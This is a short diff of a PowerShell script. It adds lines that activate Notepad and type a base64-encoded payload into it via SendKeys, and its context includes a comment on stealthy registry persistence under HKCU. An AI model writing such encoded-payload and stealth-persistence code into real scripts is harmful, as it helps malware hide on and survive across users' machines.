@@ -7,6 +7,14 @@ $bytes = [System.Text.Encoding]::Unicode.GetBytes($payload)
 $encodedPayload = [Convert]::ToBase64String($bytes)
 
 Write-Host $encodedPayload
+
+# Activate Notepad
+$wshell = New-Object -ComObject WScript.Shell
+$wshell.AppActivate($notepad.Id)
+Start-Sleep -Seconds 1  # Allow activation time
+
+$wshell.SendKeys($encodedPayload)  # Input desired text
+
 <#
 # Persistence via Registry (Stealthy) New-ItemProperty -Path "HKCU:
 # Define the registry path
